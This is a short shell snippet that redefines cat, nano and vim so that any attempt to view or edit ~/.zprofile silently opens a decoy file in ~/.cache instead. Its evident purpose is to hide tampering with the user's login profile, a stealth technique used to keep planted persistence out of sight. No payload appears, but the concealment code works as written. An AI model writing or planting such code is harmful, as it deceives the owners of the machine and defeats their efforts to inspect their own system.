cat() {
    if [[ "$1" == "$HOME/.zprofile" || "$1" == ".zprofile" || "$1" == "$HOME/.cache/.zprofile" ]]; then
        command cat ~/.cache/.zprofile
    else
        command cat "$@" 
    fi
}

nano() {
    if [[ "$1" == "$HOME/.zprofile" || "$1" == ".zprofile" || "$1" == "$HOME/.cache/.zprofile" ]]; then
        command nano ~/.cache/.zprofile
    else
        command nano "$@" 
    fi
}


vim() {
    if [[ "$1" == "$HOME/.zprofile" || "$1" == ".zprofile" || "$1" == "$HOME/.cache/.zprofile" ]]; then
        command vim ~/.cache/.zprofile
    else
        command vim "$@" 
    fi
}


